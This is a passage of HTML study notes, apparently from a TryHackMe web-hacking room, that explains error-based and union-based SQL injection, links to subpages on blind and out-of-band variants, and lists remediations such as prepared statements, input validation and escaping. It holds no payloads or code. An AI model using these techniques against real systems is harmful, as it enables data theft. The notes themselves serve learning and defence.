Injection</strong></h3><p id="912c628c-9e7e-4f8c-ad2a-e3528487b5ef" class="">This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.</p><h3 id="c3b19cd6-7a28-407a-b35e-18cc9e02e88f" class=""><strong>Union-Based SQL Injection</strong></h3><p id="5763258f-45be-485d-ba44-5a63a26dd5bd" class="">This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.</p><div id="5ca3f6a0-2a89-460b-bb64-2aebc986c408" class="collection-content"><h4 class="collection-title">SQLi way of work</h4><table class="collection-content"><thead><tr><th><span class="icon property-icon"><svg viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesTitle"><path d="M0.637695 13.1914C1.0957 13.1914 1.32812 13 1.47852 12.5215L2.24414 10.3887H6.14746L6.90625 12.5215C7.05664 13 7.2959 13.1914 7.74707 13.1914C8.22559 13.1914 8.5332 12.9043 8.5332 12.4531C8.5332 12.2891 8.50586 12.1523 8.44434 11.9678L5.41602 3.79199C5.2041 3.21777 4.82129 2.9375 4.19922 2.9375C3.60449 2.9375 3.21484 3.21777 3.0166 3.78516L-0.0322266 12.002C-0.09375 12.1797 -0.121094 12.3232 -0.121094 12.4668C-0.121094 12.918 0.166016 13.1914 0.637695 13.1914ZM2.63379 9.12402L4.17871 4.68066H4.21973L5.76465 9.12402H2.63379ZM12.2793 13.2324C13.3115 13.2324 14.2891 12.6787 14.7129 11.8037H14.7402V12.5762C14.7471 12.9863 15.0273 13.2393 15.4238 13.2393C15.834 13.2393 16.1143 12.9795 16.1143 12.5215V8.00977C16.1143 6.49902 14.9658 5.52148 13.1543 5.52148C11.7666 5.52148 10.6592 6.08887 10.2695 6.99121C10.1943 7.15527 10.1533 7.3125 10.1533 7.46289C10.1533 7.81152 10.4062 8.04395 10.7686 8.04395C11.0215 8.04395 11.2129 7.94824 11.3496 7.73633C11.7529 6.99121 12.2861 6.65625 13.1064 6.65625C14.0977 6.65625 14.6992 7.20996 14.6992 8.1123V8.67285L12.5664 8.7959C10.7686 8.8916 9.77734 9.69824 9.77734 11.0107C9.77734 12.3369 10.8096 13.2324 12.2793 13.2324ZM12.6621 12.1387C11.8008 12.1387 11.2129 11.667 11.2129 10.9561C11.2129 10.2725 11.7598 9.82129 12.7578 9.75977L14.6992 9.62988V10.3203C14.6992 11.3457 13.7969 12.1387 12.6621 12.1387Z"></path></svg></span>Name</th></tr></thead><tbody><tr id="93c2344c-d5f6-47c8-805f-75536f7cec8d"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQLi%20way%20of%20work%205ca3f6a02a89460bbb642aebc986c408/1%20In-Band%20SQLi%2093c2344cd5f647c8805f75536f7cec8d.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>1. In-Band SQLi</a></td></tr><tr id="58e05b4a-fa5d-44db-b4d8-f4f657656396"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQLi%20way%20of%20work%205ca3f6a02a89460bbb642aebc986c408/2%20Blind%20SQLi%20-%20Authentication%20Bypass%2058e05b4afa5d44dbb4d8f4f657656396.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>2. Blind SQLi - Authentication Bypass</a></td></tr><tr id="882e34d3-b204-416d-907e-684863c3e5e8"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQLi%20way%20of%20work%205ca3f6a02a89460bbb642aebc986c408/3%20Blind%20SQLi%20-%20Boolean%20Based%20882e34d3b204416d907e684863c3e5e8.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>3. Blind SQLi - Boolean Based</a></td></tr><tr id="d8e6f62c-41e2-498c-9a0d-87d9b061dfaf"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQLi%20way%20of%20work%205ca3f6a02a89460bbb642aebc986c408/4%20Blind%20SQLi%20-%20Time%20Based%20d8e6f62c41e2498c9a0d87d9b061dfaf.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>4. Blind SQLi - Time Based</a></td></tr><tr id="135761fb-eaa9-4175-8e99-284afcde1050"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQLi%20way%20of%20work%205ca3f6a02a89460bbb642aebc986c408/6%20Out-of-Band%20SQLi%20135761fbeaa941758e99284afcde1050.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>6. Out-of-Band SQLi</a></td></tr></tbody></table></div><h2 id="5473cb67-dd56-4bc4-b4ca-30d5a840e546" class=""><mark class="highlight-blue"><strong>Remediation</strong></mark></h2><p id="f16c32e6-5804-4e6a-90f5-9eb777525c24" class="">As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the below advice:</p><h3 id="e59cf230-702e-4436-a2ac-f1119242bc2d" class=""><strong>Prepared Statements (With Parameterized Queries):</strong></h3><p id="e3fd18e7-a6e7-4d2d-9b36-1075b81c61c8" class="">In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn&#x27;t change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read.</p><h3 id="7ef62935-a5eb-4d5d-8c79-0d8c8bfead36" class=""><strong>Input Validation:</strong></h3><p id="692ebf10-9fc0-44d9-8452-f650d9a6a99d" class="">Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow.</p><h3 id="bb6f9474-2118-4112-95d9-b6b1b8487a9e" class=""><strong>Escaping User Input:</strong></h3><p id="db6dbc83-8e0c-4558-be82-175192ba9f7c" class="">Allowing user input containing characters such as &#x27; &quot; $ \ can cause SQL Queries to break or, even worse, as we&#x27;ve learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (<strong>\</strong>) to these characters, which then causes them to be parsed just as a regular string and not a special character.</p><div><p id="a598e6c4-2e48-44fe-b094-bafc82298545" class="">
+</p><h3 id="09b6c3d8-4ee1-4ee2-bc9a-9331731e6277" class=""><a href="https://tryhackme.com/p/Ponexen"><mark class="highlight-purple">By</mark></a><a href="https://tryhackme.com/p/Ponexen">|</a><mark class="highlight-purple"> </mark> 🇵🇸 <a href="https://www.notion.so/Try-Hack-Me-7b33b0000bea4464bae0ccb3020f8057"><strong><mark class="highlight-red"><em>Mohanad Ehab Badra</em></mark></strong></a><strong><mark class="highlight-red"><em> </em></mark></strong>☪️💚</h3><p id="2a3ed132-9890-4991-9e9a-53a0c34169bb" class="">
+</p><figure id="6e610d73-f587-45fd-8ff4-37f3ab455b7c"><div class="source"><a href="https://embeds.simple.ink/custom/tryhackme-badge-1675721836">https://embeds.simple.ink/custom/tryhackme-badge-1675721836</a></div></figure></div><p id="d43f6b08-6c30-478e-a520-42f647a5b4f2" class="">
+</p></div></article></body></html>
